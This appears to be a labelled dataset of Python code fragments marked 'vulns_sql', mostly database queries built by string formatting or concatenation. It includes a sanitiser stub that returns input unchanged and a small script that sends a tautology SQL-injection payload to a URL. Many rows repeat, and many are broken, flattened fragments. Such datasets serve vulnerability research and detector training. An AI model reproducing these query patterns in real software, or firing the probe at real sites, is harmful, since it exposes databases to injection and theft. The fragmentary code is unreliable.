            WHERE Serial = %s;            ''' % inverter_serial        self.c.execute(query),vulns_sql
"POSTS = [(""This is the first post."", datetime.datetime.now())]  return reversed(POSTS)  POSTS.append((content, datetime.datetime.now()))",vulns_sql
"    conn = sqlite3.connect(DB_FILE)    print('sql', sql)    return res",vulns_sql
"def execute_query(cmd):    cursor.execute(cmd)",vulns_sql
"             LIMIT {}"""""".format(top_num)    return execute_query(cmd)",vulns_sql
"                    ORDER BY num DESC LIMIT {}"""""".format(top_num)    return execute_query(cmd)",vulns_sql
"                viewDetailsFrame = Frame(self, bg=""#f8f8f8"")                    selection = cursor.execute(""""""SELECT * FROM recipe WHERE name = """""" + ""\"""" + recipeName + ""\"""" )",vulns_sql
"                cursor.execute(""""""SELECT recipe FROM """""" + tableName + """""" WHERE recipe = """""" + ""\"""" + recipeName + ""\"""")                returnObject = cursor.fetchone()                if returnObject:                    print(returnObject[0])                else:                    actually_delete(recipeName)            queryString = ""\"""" + recipeName + ""\""""                cursor.execute(""""""DELETE FROM recipe WHERE name = """""" + ""\"""" + recipeName + ""\"""")                print(cursor.rowcount)                    viewRecipeFrame.pack(expand=True, fill='both')                    messagebox.showerror(""Cannot Delete"",                                         ""Cannot delete recipe, please try again."")",vulns_sql
"                selection = cursor.execute(""""""SELECT * FROM recipe WHERE name = """""" + ""\"""" + recipeName + ""\"""")",vulns_sql
"                selection = cursor.execute(""""""SELECT * FROM """""" + tableName)",vulns_sql
"    query = (        'select a.title, count(alv.article) as views from articles a, '        ' article_log_view alv where a.slug = alv.article '        ' group by a.title '        ' order by count(alv.article) desc limit %d;' % list_count)    c.execute(query)",vulns_sql
"    query = (        'select au.name, count(alv.article) as views '        ' from articles a inner join article_log_view alv '        ' on a.slug = alv.article '        ' inner join authors au '        ' on a.author = au.id '        ' group by au.name '        ' order by count(alv.article) desc;')",vulns_sql
"    query = (        'select tot.logdate, '        ' round(((err.errors_count::decimal/tot.requests_count)*100),2) '        ' as err_pct '        ' from '        ' ( select to_char(time, \'FMMonth DD, YYYY\') as logdate, '        ' count(*) as requests_count '        ' from log '        ' group by to_char(time, \'FMMonth DD, YYYY\') ) tot, '        '( select to_char(time, \'FMMonth DD, YYYY\') as logdate,  '        ' count(*) as errors_count '        ' from log '        ' where status <> \'200 OK\' '        ' group by to_char(time, \'FMMonth DD, YYYY\') ) err '        ' where '        ' tot.logdate = err.logdate '        ' and (err.errors_count::decimal/tot.requests_count) > .01; ')",vulns_sql
print_top_articles(3)print_top_authors()print_top_errors(),vulns_sql
"        cur.execute(""insert into reply_map values('{}', '{}')"".format(key, value))",vulns_sql
"    navbarMain = Post.objects.filter(published_date__lte=timezone.now())    pb = Post.objects.values('subject').annotate(newest_published_date=Max('published_date'))    pb_list = Post.objects.filter(subject__in=[b.get('subject') for b in pb], published_date__in=[b.get('newest_published_date') for b in pb])    return {'navbarMain': pb_list}",vulns_sql
"from models import base_model, task, user",vulns_sql
"        'User': user.User,",vulns_sql
"    def get(self, cls, id):        """"""        retrieves one object based on class name and id        """"""        if cls and id:            fetch = ""{}.{}"".format(cls, id)            all_obj = self.all(cls)            return all_obj.get(fetch)        return None    def count(self, cls=None):        """"""            returns the count of all objects in storage        """"""        return (len(self.all(cls))",vulns_sql
    all_users = storage.all('User').values()    verified_user = None    for user in all_users:        this_fbid = User.text_decrypt(user.fbid)        if fbid == this_fbid:            verified_user = user            break,vulns_sql
            print(db_user_task_ids),vulns_sql
            task_to_delete.delete()            print('deleted task'),vulns_sql
import bleach,vulns_sql
    name = bleach.clean(name),vulns_sql
    winner = bleach.clean(str(winner))    loser = bleach.clean(str(loser)),vulns_sql
"    c.execute(""DELETE FROM %s;"" % (table,))    c.execute(""""""UPDATE %s SET wins = 0,         loss = 0, matchesPlayed = 0"""""" % (playerTable,))",vulns_sql
"    c.execute(""DELETE FROM %s;"" % (table,))",vulns_sql
"    c.execute(""SELECT COUNT(playerID) FROM %s;"" % (table,))",vulns_sql
"    c.execute(""INSERT INTO players (playerName) VALUES ('{}')"".format(                              re.sub(r'\'', '', name)));                                                          ",vulns_sql
"    table = ""players""                                                                           c.execute(""""""SELECT playerID,                                                                   matchesPlayed FROM %s ORDER BY wins DESC;"""""" % (table,))                            ",vulns_sql
"    c.execute(""""""INSERT INTO matches (winner, loser)                                                VALUES ('%i', '%i')"""""" % (winner, loser))                                               c.execute(""""""UPDATE players SET wins = wins + 1,                                                WHERE playerID = %s"""""" % (winner,))                                                     c.execute(""""""UPDATE players SET loss = loss + 1,                                                WHERE playerID = %s"""""" % (loser,))                                                  ",vulns_sql
"    table = ""players""                                                                           c.execute(""""""SELECT playerID,                                                                   playerName FROM %s ORDER BY wins DESC;"""""" % (table,))                               ",vulns_sql
    return None ,vulns_sql
    rows = cur.fetchall()    for row in rows:,vulns_sql
"for carg in sys.argv:	if carg == ""-w"":		arg_num = sys.argv.index(carg)		arg_num += 1		if len(sys.argv) > arg_num:			uri = sys.argv[arg_num]injected_url = uri + ""1'%20or%20'1'%20=%20'1""resp = urllib.request.urlopen(injected_url)",vulns_sql
"                yield ""NULL""",vulns_sql
"                yield ""NULL""",vulns_sql
"            is_null = all([isinstance(v, str) and v.upper() == ""NULL"" for v in values])                        print(""\t "".join(values))                    print("","".join(values))",vulns_sql
"                        db_insert(sql_conn, settings[""sql_table""], columns, values, debug=debug)",vulns_sql
"    col_str = str(columns).replace(""'"", ""`"")    sql = f""INSERT INTO {table} {col_str} VALUES {values};""    cursor.execute(sql)",vulns_sql
"        self.user_id = db.select('user', ""telegram_id = "" + str(telegram_id))[0]['id']        self.path = [db.select('directory', ""name = '/' AND parent_directory_id = 'NULL' AND user_id = "" + str(self.user_id))[0]['id']]        directory_ids_string = ', '.join([str(each) for each in self.path])                'directories': db.select('directory', ""parent_directory_id = "" + str(directory_id) + "" AND user_id = "" + str(self.user_id)),                'files': db.select('file', ""directory_id = "" + str(directory_id) + "" AND user_id = "" + str(self.user_id))        return db.insert('directory', {'name': directory_name, 'parent_directory_id': parent_directory_id, 'user_id': self.user_id})        return db.insert('file', {'name': name, 'mime': mime, 'size': size, 'telegram_id': telegram_id, 'directory_id': directory_id, 'user_id': self.user_id})        file_ids_string = ', '.join([str(each) for each in file_ids])        directory_ids_string = ', '.join([str(each) for each in directory_ids])",vulns_sql
"    bot.send_message(message.from_user.id, ""- Write /start to begin\n- You can send files, images, videos, etc. and they will be stored in your current path\n- If you write a message to the bot, it will make a directory with that name in the current path\n- You can delete files or directories using the red cross next to them\n- I have tried to make this bot as similar as possible to a basic file explorer\n- You can donate using /donate"")",vulns_sql
"    bot.send_message(telegram_id, ""- Write /start to begin\n- You can send files, images, videos, etc. and they will be stored in your current path\n- If you write a message to the bot, it will make a directory with that name in the current path\n- I have tried to make this bot as similar as possible to a basic file explorer\n- You can donate using /donate"")    explorers[telegram_id] = Explorer(telegram_id)def content_builder(content, up=True):    markup = telebot.types.InlineKeyboardMarkup()    if (up):        markup.add(telebot.types.InlineKeyboardButton(' Go up', callback_data='..'))    if (content['directories']):        for each in content['directories']:            markup.add(                    telebot.types.InlineKeyboardButton("" "" + each['name'], callback_data=""d"" + str(each['id'])),                    telebot.types.InlineKeyboardButton("""", callback_data=""rd"" + str(each['id'])),                )    if (content['files']):        for each in content['files']:            if (each['mime'] in icon_mime):                icon = icon_mime[each['mime']]            else:                icon = icon_mime['U']            markup.add(                    telebot.types.InlineKeyboardButton(icon + "" "" + each['name'], callback_data=""f"" + str(each['id'])),                    telebot.types.InlineKeyboardButton("""", callback_data=""rf"" + str(each['id'])),                )    return markup        explorers[telegram_id].new_file(message.message_id, message.document.file_name, mime, message.document.file_size)        explorers[telegram_id].new_file(message.message_id, ""audio"" + str(message.date), 'A', message.audio.file_size)        explorers[telegram_id].new_file(message.message_id, ""document"" + str(message.date), 'D', message.document.file_size)        explorers[telegram_id].new_file(message.message_id, ""photo"" + str(message.date), 'P', message.photo[0].file_size)        explorers[telegram_id].new_file(message.message_id, ""video"" + str(message.date), 'V', message.video.file_size)        explorers[telegram_id].new_file(message.message_id, ""video_note"" + str(message.date), 'V', message.video_note.file_size)        explorers[telegram_id].new_file(message.message_id, ""voice"" + str(message.date), 'A', message.voice.file_size)        explorers[telegram_id].new_file(message.message_id, ""contact"" + str(message.date), 'D', message.contact.file_size)    bot.reply_to(message, """")    explorers[telegram_id].new_directory(new_directory_name)    content = explorers[telegram_id].get_directory_content()    keyboard = content_builder(content, len(explorers[telegram_id].path) > 1)    message_sent = bot.send_message(telegram_id, explorers[telegram_id].get_path_string(), reply_markup=keyboard)    explorers[telegram_id].last_action_message_ids.append(message_sent.message_id)        explorers[telegram_id].go_to_parent_directory()        explorers[telegram_id].go_to_directory(content_id)",vulns_sql
"            explorers[telegram_id].remove_directories([content_id])            explorers[telegram_id].remove_files([content_id])    if (explorers[telegram_id].last_action_message_ids):        for message_id in explorers[telegram_id].last_action_message_ids:            result.append(bot.delete_message(telegram_id, message_id))            explorers[telegram_id].last_action_message_ids.remove(message_id)    content = explorers[telegram_id].get_directory_content()    keyboard = content_builder(content, len(explorers[telegram_id].path) > 1)    message_sent = bot.send_message(telegram_id, explorers[telegram_id].get_path_string(), reply_markup=keyboard)    explorers[telegram_id].last_action_message_ids.append(message_sent.message_id)",vulns_sql
"        left join series as s on s.id=b.series_id    inputs = {""limit"": pagesize, ""offset"": int(page * pagesize)}    rst = csr.execute(stmt, inputs)    return {""rows"": rows, ""count"": get_all_books_count()}def get_all_books_count():    """"""    Total count of books    :return:    """"""    stmt = """"""        select count(*) from books as b        left outer join collaborations as c on c.book_id=b.id        left outer join authors as a on a.id=c.author_id        left join series as s on s.id=b.series_id        """"""    csr = get_cursor()    count = csr.execute(stmt).fetchone()[0]    return count    inputs = {""limit"": pagesize, ""offset"": int(page * pagesize)}        wh = ""where c.author_id="" + str(author_id)        wh = ""where b.series_id="" + str(series_id)        inputs[""like""] = s",vulns_sql
"    rst = csr.execute(stmt, inputs)    parameters = ()        wh = ""where c.author_id="" + str(int(author_id))        wh = ""where b.series_id="" + str(int(series_id))        parameters += (s.encode('utf-8'),)        wh = 'where b.Title like ?'",vulns_sql
"    if len(parameters) > 0:        count = csr.execute(stmt, parameters).fetchone()[0]    else:        count = csr.execute(stmt).fetchone()[0]",vulns_sql
		if data == {}:			data = -1		if data == {}:			data = -1,vulns_sql
"            cursor.execute(""""""UPDATE botnet_info SET %s = '%s' WHERE id == '%s'"""""" % (target, status, str(botnetID)))",vulns_sql
"    def sql(self, cmd, one=False):        if self.debug:            print cmd        self.cur.execute(cmd)        if one:            return self.cur.fetchone()        else:            return self.cur.fetchall()        self.sql(""INSERT INTO note(authorId, date, title, content, privacy) VALUES(%d, '%s', '%s', '%s', '%s')"" %            keywordId = self.sql(""SELECT keywordId FROM keyword WHERE keyword='%s';"" % keyword, one=True)                self.sql(""INSERT INTO keyword(keyword) VALUES ('%s');"" % keyword)            self.sql(""INSERT INTO notekeyword(noteId, keywordID) VALUES(%d, %d)"" % (noteId, keywordId))            noteIds = self.sql(""SELECT noteId from note;"")                    keywordId = self.sql(""SELECT keywordId FROM keyword WHERE keyword='%s';"" % keyword)[0]                        keywordId = keywordId[0]                        for noteId in self.sql(""SELECT noteId FROM notekeyword WHERE keywordId=%d;"" % keywordId):                                print '   ', noteId            if self.debug:                print ""noteIds:"", noteIds, ""\n""            res = self.sql(""SELECT noteId, date, title, content, privacy FROM note WHERE noteId=%s;"" % n, one=True)            keys = self.sql(""SELECT keywordid FROM notekeyword WHERE notekeyword.noteid = %d;"" % n)            for k in keys:                keywords.append(self.sql(""SELECT keyword FROM keyword WHERE keywordId = %d;"" % k, one=True)[0])",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        cr.execute("""""" select id from account_journal                            where auto_cash='True' and type='cash'                            and id in (%s)"""""" %(','.join(map(lambda x: ""'"" + str(x) + ""'"", j_ids))))        journal_ids = map(lambda x1: x1[0], cr.fetchall())",vulns_sql
"        from_date=context.get('from_date',False)        to_date=context.get('to_date',False)        date_str=False            date_str=""date_planned>='%s' and date_planned<='%s'""%(from_date,to_date)            date_str=""date_planned>='%s'""%(from_date)            date_str=""date_planned<='%s'""%(to_date)",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)            )",vulns_sql
"            self.cursor.execute('insert into item (name, shoppinglistid) values (""%s"", ""%s"")' % (item[0], item[1]))",vulns_sql
"            self.cursor.execute('insert into itemlanguage (language) values (""%s"")' % language[0])    def add_translation(self, trid):            self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values (""%s"", ""%s"", ""%s"")' % (trid[0], trid[1], trid[2]))                self.cursor.execute('insert into itemtranslation (itemid, itemlanguageid, translation) values (""%s"", ""%s"", ""%s"")' % (item[0], trname[1], trname[2]))",vulns_sql
"    def add_store(self, store):        """"""""Add new store""""""        t = (store[0], )        self.cursor.execute('insert into store (name) values (?)', t)        self.connection.commit()",vulns_sql
            db.add_translation(args.translationid),vulns_sql
"    def get_flat_tree(self, cr, uid, root_id, level=0):        """""" return informations about a buget items tree strcuture.        Data are returned in a list        (value=dictionnary(keys='id','code','name','level', sequence, type, style))        algorithm in order to allow to display easily the tree in rapports        example::            root            |_node 1                |_sub node 1            |_node 2            |_ ...        Do not specify the level param when you call this method,        it is used for recursive calls        result = []        if (level == 0):            query = """"""SELECT id, code, name, sequence, type, style, %s as level                       FROM budget_item                       WHERE id = %s """""" % (level, str(root_id))            cr.execute(query)            result.append(cr.dictfetchall()[0])            level += 1        query = """"""SELECT id, code, name, sequence, type, style, %s as level                   FROM budget_item                   WHERE parent_id = %s                   AND active                   ORDER BY sequence """""" % (level, str(root_id))        cr.execute(query)        query_result = cr.dictfetchall()        for child in query_result:            result.append(child)            result += self.get_flat_tree(cr, uid, child['id'], level + 1)        if (level > 100):            raise osv.except_osv(_('Recursion Error'),                                 _(""It seems the budget items structure ""                                   ""is recursive (or too deep). ""                                   ""Please check and correct it ""                                   ""before to run this action again""))        return result",vulns_sql
"from blueprints.database import FuckingCoolORMfrom blueprints.forum import forumfrom blueprints.post import postfrom blueprints.user import userfrom blueprints.thread import threadapp.register_blueprint(forum, url_prefix=BASE_URL)app.register_blueprint(post, url_prefix=BASE_URL)app.register_blueprint(user, url_prefix=BASE_URL)app.register_blueprint(thread, url_prefix=BASE_URL)        ""forum"": FuckingCoolORM.Instance().get_count(""forum_t""),        ""post"": FuckingCoolORM.Instance().get_count(""post_t""),        ""user"": FuckingCoolORM.Instance().get_count(""user_t""),        ""thread"": FuckingCoolORM.Instance().get_count(""thread_t""),",vulns_sql
"        res += ""  {0}\n"".format(i)",vulns_sql
"def safe_injection(string):    """"""    remove "" ' etc ...    """"""    return stringclass Singleton:    """"""    A non-thread-safe helper class to ease implementing singletons.    This should be used as a decorator -- not a metaclass -- to the    class that should be a singleton.    The decorated class can define one `__init__` function that    takes only the `self` argument. Other than that, there are    no restrictions that apply to the decorated class.    To get the singleton instance, use the `Instance` method. Trying    to use `__call__` will result in a `TypeError` being raised.    Limitations: The decorated class cannot be inherited from.    """"""    def __init__(self, decorated):        self._decorated = decorated    def Instance(self):        """"""        Returns the singleton instance. Upon its first call, it creates a        new instance of the decorated class and calls its `__init__` method.        On all subsequent calls, the already created instance is returned.        """"""        try:            return self._instance        except AttributeError:            self._instance = self._decorated()            return self._instance    def __call__(self):        raise TypeError('Singletons must be accessed through `Instance()`.')    def __instancecheck__(self, inst):        return isinstance(inst, self._decorated)@Singletonclass FuckingCoolORM(object):    def __init__(self):        pass    def get_count(self, db_table):        return 123",vulns_sql
"BASE_URL = ""/forum""forum = Blueprint(""forum"", __name__)@forum.route(BASE_URL + ""/create"", methods=[""GET""])",vulns_sql
"BASE_URL = ""/post""post = Blueprint(""post"", __name__)@post.route(BASE_URL + ""/create"", methods=[""GET""])",vulns_sql
"BASE_URL = ""/thread""thread = Blueprint(""thread"", __name__)@thread.route(BASE_URL + ""/create"", methods=[""GET""])",vulns_sql
"BASE_URL = ""/user""user = Blueprint(""user"", __name__)@user.route(BASE_URL + ""/create"", methods=[""GET""])",vulns_sql
"    conn = psycopg2.connect(""dbname=unlock user=ubuntu"")    cur.execute(""SELECT * FROM nile_items;"")        if term in res[i][0] or term in res[i][3]:            items[i][""name""] = res[i][0]            items[i][""price""] = res[i][1]            items[i][""image""] = res[i][2]",vulns_sql
"            self.gigachannel_community = community_cls(peer, self.ipv8.endpoint, self.ipv8.network, self.mds)",vulns_sql
"                        exclude_deleted=False, hide_xxx=False, **kwargs):",vulns_sql
"from Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED, \    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT, \    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE, \    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TRIBLER, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER, \    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK, STATE_SHUTDOWN",vulns_sql
"from Tribler.Core.simpledefs import (NTFY_TORRENTS, NTFY_PLAYLISTS, NTFY_COMMENTS,                                     NTFY_MODIFICATIONS, NTFY_MODERATIONS, NTFY_MARKINGS, NTFY_MYPREFERENCES,                                     NTFY_ACTIVITIES, NTFY_REACHABLE, NTFY_CHANNELCAST, NTFY_VOTECAST, NTFY_DISPERSY,                                     NTFY_TRACKERINFO, NTFY_UPDATE, NTFY_INSERT, NTFY_DELETE, NTFY_TUNNEL,                                     NTFY_STARTUP_TICK, NTFY_CLOSE_TICK, NTFY_UPGRADER,                                     SIGNAL_ALLCHANNEL_COMMUNITY, SIGNAL_SEARCH_COMMUNITY, SIGNAL_TORRENT,                                     SIGNAL_CHANNEL, SIGNAL_CHANNEL_COMMUNITY, SIGNAL_RSS_FEED,                                     NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_NEW_VERSION, NTFY_TRIBLER,                                     NTFY_UPGRADER_TICK, NTFY_TORRENT, NTFY_CHANNEL, NTFY_MARKET_ON_ASK,                                     NTFY_MARKET_ON_BID, NTFY_MARKET_ON_TRANSACTION_COMPLETE,                                     NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID_TIMEOUT,                                     NTFY_MARKET_IOM_INPUT_REQUIRED, NTFY_MARKET_ON_PAYMENT_RECEIVED,                                     NTFY_MARKET_ON_PAYMENT_SENT, SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING,                                     STATE_SHUTDOWN)",vulns_sql
"                SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING, STATE_SHUTDOWN]",vulns_sql
"    def add_random_torrent(self, metadata_cls):            ""title"": ""test"",",vulns_sql
"from Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED,\    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT,\    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE,\    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER,\    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK",vulns_sql
        self.messages_to_wait_for = 20,vulns_sql
"from Tribler.Core.Utilities.utilities import http_get, is_valid_url, parse_magnetlink",vulns_sql
from Tribler.Core.Modules.MetadataStore.serialization import CHANNEL_TORRENT,vulns_sql
"    master_peer = Peer(unhexlify(""3081a7301006072a8648ce3d020106052b8104002703819200040448a078b597b62d3761a061872cd86""                                 ""10f58cb513f1dc21e66dd59f1e01d582f633b182d9ca6e5859a9a34e61eb77b768e5e9202f642fd50c6""                                 ""0b89d8d8b0bdc355cdf8caac262f6707c80da00b1bcbe7bf91ed5015e5163a76a2b2e630afac96925f5""                                 ""daa8556605043c6da4db7d26113cba9f9cbe63fddf74625117598317e05cb5b8cbd606d0911683570ad""                                 ""bb921c91""))    def __init__(self, my_peer, endpoint, network, metadata_store):",vulns_sql
"    master_peer = Peer(unhexlify(""3081a7301006072a8648ce3d020106052b81040027038192000401b9f303778e7727b35a4c26487481f""                                 ""a7011e252cc4a6f885f3756bd8898c9620cf1c32e79dd5e75ae277a56702a47428ce47676d005e262fa""                                 ""fd1a131a2cb66be744d52cb1e0fca503658cb3368e9ebe232e7b8c01e3172ebfdb0620b316467e5b2c4""                                 ""c6809565cf2142e8d4322f66a3d13a8c4bb18059c9ed97975a97716a085a93e3e62b0387e63f0bf389a""                                 ""0e9bffe6""))",vulns_sql
    received_search_result_channel = pyqtSignal(object)    received_search_result_torrent = pyqtSignal(object),vulns_sql
"            if ""infohash"" in item:",vulns_sql
        if response['first'] >= self.model.rowCount():            self.model.add_items(response['results']),vulns_sql
"            self._pool.put(MySQLdb.connect(hostaddr, usr, pwd, dbname), block=False)",vulns_sql
"    def gen_sql_insert(self, listing, cat_id):",vulns_sql
"        sql_vals = """""") VALUES ({id:d}, '{url:s}', {loc_id:d}, '{title:s}', '{pubdate:s}', '{desc:s}'"""""".format(            id=listing.id,            url=listing.url,            loc_id=listing.loc_id,            title=listing.title,            pubdate=listing.pubdate.strftime(                '%Y-%m-%d %H:%M:%S'),            desc=listing.description)        val_list = [listing.addr, listing.price, listing.bedrooms, listing.bathrooms, listing.pet_friendlly,                    listing.furnished, listing.urgent, listing.size]        sql_list = [lambda: ""'{:s}'"".format(listing.addr), lambda: ""{:f}"".format(listing.price),                    lambda: ""{:f}"".format(listing.bedrooms),                    lambda: ""{:f}"".format(listing.bathrooms), lambda: ""{:d}"".format(int(listing.pet_friendlly)),                    lambda: ""{:d}"".format(int(listing.furnished)), lambda: ""{:d}"".format(int(listing.urgent)),                    lambda: ""{:f}"".format(listing.size)]                sql_vals += "", "" + sql_list[i]()        output = sql_cols + sql_vals + ')'        return output    def update_table(self, listings, cat_id):",vulns_sql
"            logger.debug('Generating SQL command')            sql = self.gen_sql_insert(l, cat_id)",vulns_sql
                cursor.execute(sql),vulns_sql
